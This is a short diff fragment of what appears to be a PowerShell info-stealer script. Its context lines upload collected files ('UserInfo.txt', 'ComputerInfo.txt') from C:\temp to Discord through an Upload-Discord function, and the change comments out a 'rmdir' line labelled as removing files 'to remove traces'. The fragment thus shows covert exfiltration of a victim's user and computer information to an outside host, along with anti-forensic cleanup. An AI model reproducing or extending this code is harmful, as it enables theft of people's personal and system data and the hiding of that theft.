@@ -37,7 +37,7 @@ Upload-Discord -file "C:\temp\UserInfo.txt" -text "User Informations :"
 Upload-Discord -file "C:\temp\ComputerInfo.txt" -text "Computer Informations :"
 
 #Removing every file to remove traces
-rmdir -R \temp
+#rmdir -R \temp
 }
 
 function Upload-Discord {
